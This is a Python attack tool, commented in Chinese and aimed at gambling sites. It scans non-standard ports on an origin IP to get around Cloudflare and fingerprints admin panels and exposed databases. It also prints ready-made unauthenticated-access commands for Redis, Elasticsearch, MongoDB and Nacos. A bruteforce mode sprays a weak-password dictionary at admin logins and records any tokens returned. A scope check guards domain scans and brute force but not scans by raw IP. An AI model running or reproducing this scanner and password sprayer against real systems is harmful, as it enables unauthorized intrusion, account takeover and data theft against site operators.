#!/usr/bin/env python3
"""非标准端口 Admin 面板扫描 — 博彩站专项。

Cloudflare 默认只代理 80/443。Admin 后台跑在非标准端口时 CF 拦不了，
用住宅 IP 直打即可绕过。

示例:
  python3 炼蛊房/port_admin_scan.py scan \
    --ip 1.2.3.4 --case <案卷>
  python3 炼蛊房/port_admin_scan.py scan \
    --domain target.com --resolve --case <案卷>
  python3 炼蛊房/port_admin_scan.py bruteforce \
    --url http://1.2.3.4:8080/admin --case <案卷>
"""
from __future__ import annotations
import argparse
import json
import re
import socket
import sys
import time
import concurrent.futures
from datetime import datetime, UTC
from pathlib import Path

try:
    import requests
    requests.packages.urllib3.disable_warnings()  # type: ignore
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False

ENGINE = Path(__file__).resolve().parents[1]
OPS = Path(__file__).resolve().parent
if str(OPS) not in sys.path:
    sys.path.insert(0, str(OPS))
from scope_lib import in_scope, host_of  # noqa: E402

def _now(): return datetime.now(UTC).strftime("%Y-%m-%dT%H:%M:%SZ")
def case_dir(case: str) -> Path:
    d = ENGINE / "案卷" / case / "测绘" / "ports"
    d.mkdir(parents=True, exist_ok=True)
    return d

# 博彩站常见非标准 Admin 端口
ADMIN_PORTS = [
    # Web 服务
    8080, 8081, 8082, 8083, 8085, 8086, 8087, 8088, 8089,
    8443, 8444, 8445,
    8888, 8899,
    9000, 9001, 9090, 9091, 9099,
    9200,  # Elasticsearch（高价值）
    9300,  # ES transport
    # 管理面板
    3000, 3001, 3002, 3003,  # Node/React dev
    4000, 4001,
    5000, 5001,
    7000, 7001, 7070, 7080, 7443,
    # cPanel / Plesk
    2082, 2083, 2086, 2087, 2095, 2096,
    # 数据库（暴露时直连）
    3306, 3307,   # MySQL
    5432,         # PostgreSQL
    6379, 6380,   # Redis（高价值）
    27017, 27018, # MongoDB
    1433,         # MSSQL
    # 消息队列
    8161, 61616,  # ActiveMQ
    15672, 5672,  # RabbitMQ
    9092,         # Kafka
    1883, 8883,   # MQTT
    # 其他管理
    10000, 10001, # Webmin / 自定义
    8848,         # Nacos
    4848,         # GlassFish admin
    8880,
    18080, 18081, 18443,
    28080,
    38080,
    48080,
]

# 后台路径检测
ADMIN_PATHS = [
    "/", "/admin", "/admin/", "/admin/login",
    "/admin/index", "/admin/index.php",
    "/manage", "/manage/login",
    "/backend", "/backend/login",
    "/dashboard", "/operator",
    "/api/v1/", "/actuator", "/actuator/health",
    "/nacos", "/nacos/",
    "/_/",   # PocketBase
]

ADMIN_FINGERPRINTS = {
    "login_form": [r'type="password"', r'登录', r'Login', r'Sign In'],
    "api_json": [r'"code":', r'"status":', r'"data":'],
    "admin_panel": [r'admin', r'后台', r'管理', r'dashboard', r'Dashboard'],
    "spring_boot": [r'"_links"', r'"status":"UP"', r'actuator'],
    "nacos": [r'Nacos', r'"pageItems"', r'nacos'],
    "elastic": [r'"cluster_name"', r'"version"', r'"tagline"'],
    "redis_banner": [r'\+PONG', r'-ERR', r'\*\d+\r\n'],
    "pocketbase": [r'PocketBase', r'"collections"', r'/_/'],
}

def tcp_connect(ip: str, port: int, timeout: float = 3.0) -> bool:
    try:
        s = socket.create_connection((ip, port), timeout=timeout)
        s.close()
        return True
    except Exception:
        return False

def probe_http(ip: str, port: int, timeout: float = 8.0) -> dict:
    result = {"port": port, "open": True, "http": False, "findings": [], "paths": []}
    if not HAS_REQUESTS:
        return result
    for scheme in ("https", "http"):
        base = f"{scheme}://{ip}:{port}"
        for path in ADMIN_PATHS:
            try:
                r = requests.get(base + path, timeout=timeout,
                                 verify=False, allow_redirects=True)
                if r.status_code in (200, 301, 302, 403):
                    result["http"] = True
                    title = re.search(r"<title[^>]*>([^<]{1,80})</title>", r.text, re.I)
                    hits = []
                    body = r.text[:3000]
                    for fp, patterns in ADMIN_FINGERPRINTS.items():
                        if any(re.search(p, body, re.I) for p in patterns):
                            hits.append(fp)
                    if hits or r.status_code == 200:
                        entry = {
                            "url": base + path,
                            "status": r.status_code,
                            "title": title.group(1).strip() if title else "",
                            "server": r.headers.get("Server", ""),
                            "fingerprints": hits,
                            "content_len": len(r.content),
                        }
                        result["paths"].append(entry)
                        result["findings"].extend(hits)
            except Exception:
                pass
        if result["http"]:
            break
    return result

def cmd_scan(args: argparse.Namespace) -> int:
    # 解析目标 IP
    if args.ip:
        target_ip = args.ip
    elif args.domain:
        domain = host_of(args.domain)
        if not in_scope(domain):
            raise SystemExit(f"[scope] {domain} 不在授权范围")
        try:
            target_ip = socket.gethostbyname(domain)
            print(f"[*] {domain} → {target_ip}")
        except Exception as e:
            raise SystemExit(f"[err] resolve failed: {e}")
    else:
        raise SystemExit("[err] --ip 或 --domain 必须指定一个")

    ports = args.ports if args.ports else ADMIN_PORTS
    print(f"[*] scanning {len(ports)} ports on {target_ip} …", flush=True)

    open_ports = []
    with concurrent.futures.ThreadPoolExecutor(max_workers=args.concurrency) as pool:
        futs = {pool.submit(tcp_connect, target_ip, p, args.tcp_timeout): p for p in ports}
        for fut in concurrent.futures.as_completed(futs):
            port = futs[fut]
            if fut.result():
                open_ports.append(port)
                print(f"  [OPEN] :{port}", flush=True)

    print(f"\n[*] {len(open_ports)} open ports: {sorted(open_ports)}")
    print("[*] probing HTTP services …", flush=True)

    http_results = []
    for port in open_ports:
        r = probe_http(target_ip, port, args.http_timeout)
        if r["http"]:
            http_results.append(r)
            fps = list(set(r["findings"]))
            print(f"\n  ★ :{port} — fingerprints={fps}")
            for p in r["paths"][:3]:
                print(f"    [{p['status']}] {p['url']}  {p['title']!r}  {p['fingerprints']}")

    out = case_dir(args.case)
    report = {
        "ts": _now(), "target": target_ip,
        "total_ports": len(ports),
        "open_ports": sorted(open_ports),
        "http_services": http_results,
    }
    out_json = out / "port_admin_scan.json"
    out_json.write_text(json.dumps(report, ensure_ascii=False, indent=2) + "\n", encoding="utf-8")
    print(f"\n[result] {len(open_ports)} open, {len(http_results)} HTTP → {out_json}")

    # 后续行动建议
    high_value = [r for r in http_results if
                  any(fp in r["findings"] for fp in ["login_form", "admin_panel", "nacos",
                                                      "spring_boot", "elastic", "pocketbase"])]
    if high_value:
        print("\n★★★ 高价值目标:")
        for r in high_value:
            for p in r["paths"]:
                if p["fingerprints"]:
                    print(f"  {p['url']}  [{p['status']}]  {p['fingerprints']}")
    # Redis/ES 直连
    for port in open_ports:
        if port == 6379:
            print(f"\n★ Redis 开放 → redis-cli -h {target_ip} ping")
        elif port == 9200:
            print(f"\n★ Elasticsearch → curl http://{target_ip}:9200/_cat/indices")
        elif port == 27017:
            print(f"\n★ MongoDB → mongo {target_ip}:27017 --eval 'db.adminCommand({{listDatabases:1}})'")
        elif port == 8848:
            print(f"\n★ Nacos → python3 tools/1day-kit/od_kit.py nuclei "
                  f"--url http://{target_ip}:8848 --template-id nacos-unauth --case {args.case}")
    return 0 if open_ports else 1

def cmd_bruteforce(args: argparse.Namespace) -> int:
    """对已发现的 Admin 登录面板做弱口令爆破。"""
    if not HAS_REQUESTS:
        raise SystemExit("[err] requests not installed")
    url = args.url
    domain = host_of(url)
    if not in_scope(domain):
        raise SystemExit(f"[scope] {domain} 不在授权范围")

    pwd_file = Path(args.passwords or ENGINE / "dict" / "gambling_admin_passwords.txt")
    user_file = Path(args.users) if args.users else None
    usernames = ["admin", "administrator", "root", "manager", "operator", "super"]
    if user_file and user_file.is_file():
        usernames = [l.strip() for l in user_file.read_text(encoding="utf-8").splitlines()
                     if l.strip() and not l.startswith("#")]
    passwords = [l.strip() for l in pwd_file.read_text(encoding="utf-8").splitlines()
                 if l.strip() and not l.startswith("#")][:200]

    print(f"[*] bruteforce {url}  users={len(usernames)}  passwords={len(passwords)}")
    sess = requests.Session()
    sess.headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/126.0.0.0"
    sess.verify = False
    hits = []

    for user in usernames:
        for pwd in passwords:
            # 尝试 JSON
            try:
                r = sess.post(url, json={"username": user, "password": pwd,
                                          "account": user, "pass": pwd},
                              timeout=args.timeout)
                data = {}
                try: data = r.json()
                except: pass
                code = data.get("code", data.get("status", -1))
                token = data.get("token") or (data.get("data") or {}).get("token")
                success = (code in (0, 200, "0", "200") and r.status_code == 200
                           and "error" not in str(data.get("msg","")).lower()) or bool(token)
                if success:
                    print(f"  ★★★ HIT: {user}/{pwd}  token={token}")
                    hits.append({"user": user, "password": pwd, "token": token, "url": url})
            except Exception:
                pass
            time.sleep(args.delay)

    out = case_dir(args.case)
    (out / "bruteforce.json").write_text(
        json.dumps({"ts": _now(), "url": url, "hits": hits}, ensure_ascii=False, indent=2) + "\n",
        encoding="utf-8")
    print(f"[result] {len(hits)} hits")
    return 0 if hits else 1

def main() -> int:
    p = argparse.ArgumentParser(description="非标准端口 Admin 面板扫描")
    sub = p.add_subparsers(dest="cmd", required=True)

    sc = sub.add_parser("scan", help="扫描非标准端口")
    sc.add_argument("--ip", default="")
    sc.add_argument("--domain", default="")
    sc.add_argument("--case", required=True)
    sc.add_argument("--ports", nargs="*", type=int, default=[])
    sc.add_argument("--concurrency", type=int, default=50)
    sc.add_argument("--tcp-timeout", type=float, default=3.0)
    sc.add_argument("--http-timeout", type=float, default=8.0)
    sc.set_defaults(func=cmd_scan)

    bf = sub.add_parser("bruteforce", help="弱口令爆破已发现的 Admin 面板")
    bf.add_argument("--url", required=True)
    bf.add_argument("--case", required=True)
    bf.add_argument("--passwords", default="")
    bf.add_argument("--users", default="")
    bf.add_argument("--timeout", type=float, default=8.0)
    bf.add_argument("--delay", type=float, default=0.3)
    bf.set_defaults(func=cmd_bruteforce)

    args = p.parse_args()
    return int(args.func(args) or 0)

if __name__ == "__main__":
    raise SystemExit(main())
